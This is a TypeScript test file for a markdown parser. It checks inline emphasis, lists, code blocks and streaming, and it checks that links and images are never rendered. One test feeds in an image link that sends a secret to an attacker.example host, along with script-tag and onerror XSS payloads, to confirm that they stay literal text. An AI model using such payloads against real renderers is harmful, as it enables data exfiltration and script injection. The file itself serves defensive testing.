import { describe, expect, it } from "vitest";
import { parseBlocks, parseInline } from "../../src/client/markdown-parse";

const flatten = (s: string) =>
  parseInline(s)
    .map((p) => p.text)
    .join("");

describe("parseInline", () => {
  it("handles bold, italic and code", () => {
    expect(parseInline("a **b** c _d_ e `f`")).toEqual([
      { kind: "text", text: "a " },
      { kind: "bold", text: "b" },
      { kind: "text", text: " c " },
      { kind: "italic", text: "d" },
      { kind: "text", text: " e " },
      { kind: "code", text: "f" }
    ]);
  });

  it("does not treat snake_case or math as emphasis", () => {
    expect(parseInline("use env_var_name and 2*3*4")).toEqual([
      { kind: "text", text: "use env_var_name and 2*3*4" }
    ]);
  });

  it("never produces a link: shows the label and the plain URL", () => {
    expect(parseInline("see [docs](https://example.com/x) now")).toEqual([
      { kind: "text", text: "see " },
      { kind: "text", text: "docs (https://example.com/x)" },
      { kind: "text", text: " now" }
    ]);
  });

  it("never produces an image or HTML: the characters stay as literal text", () => {
    const evil =
      "![x](https://attacker.example/?q=secret) <img src=x onerror=alert(1)> <script>alert(1)</script>";
    const parts = parseInline(evil);
    expect(
      parts.every(
        (p) =>
          p.kind === "text" ||
          p.kind === "bold" ||
          p.kind === "italic" ||
          p.kind === "code"
      )
    ).toBe(true);
    // The text survives verbatim as text, to be escaped by React, never parsed as markup.
    expect(flatten(evil)).toContain("<script>alert(1)</script>");
    expect(flatten(evil)).toContain("<img src=x onerror=alert(1)>");
  });

  it("handles unbalanced markers without hanging", () => {
    expect(flatten("**unclosed and `also unclosed")).toBe(
      "**unclosed and `also unclosed"
    );
    expect(flatten("_".repeat(5000))).toHaveLength(5000);
  });

  it("returns nothing for empty input", () => {
    expect(parseInline("")).toEqual([]);
  });
});

describe("parseBlocks", () => {
  it("splits paragraphs, lists and code", () => {
    const blocks = parseBlocks(
      'Intro line\nsecond line\n\n- one\n- two\n\n1. first\n2. second\n\n```json\n{"a": 1}\n```\n\nDone'
    );
    expect(blocks.map((b) => b.kind)).toEqual(["p", "ul", "ol", "code", "p"]);
    const code = blocks[3];
    expect(code.kind === "code" && code.text).toBe('{"a": 1}');
    expect(code.kind === "code" && code.lang).toBe("json");
    const ul = blocks[1];
    expect(ul.kind === "ul" && ul.items).toHaveLength(2);
  });

  it("keeps a code block that has not been closed yet (streaming)", () => {
    const blocks = parseBlocks("Here:\n```ts\nconst a = 1;");
    expect(blocks.map((b) => b.kind)).toEqual(["p", "code"]);
  });

  it("turns headings into plain paragraphs", () => {
    const [b] = parseBlocks("## Title");
    expect(b.kind).toBe("p");
    expect(b.kind === "p" && flatten("## Title".replace(/^#+\s+/, ""))).toBe(
      "Title"
    );
  });

  it("does not interpret HTML inside code blocks", () => {
    const [b] = parseBlocks("```\n<script>alert(1)</script>\n```");
    expect(b.kind === "code" && b.text).toBe("<script>alert(1)</script>");
  });

  it("handles empty and whitespace-only input", () => {
    expect(parseBlocks("")).toEqual([]);
    expect(parseBlocks("   \n\n  ")).toEqual([]);
  });

  it("copes with CRLF and very long input", () => {
    expect(parseBlocks("a\r\n\r\nb")).toHaveLength(2);
    expect(parseBlocks("x ".repeat(50_000))).toHaveLength(1);
  });
});
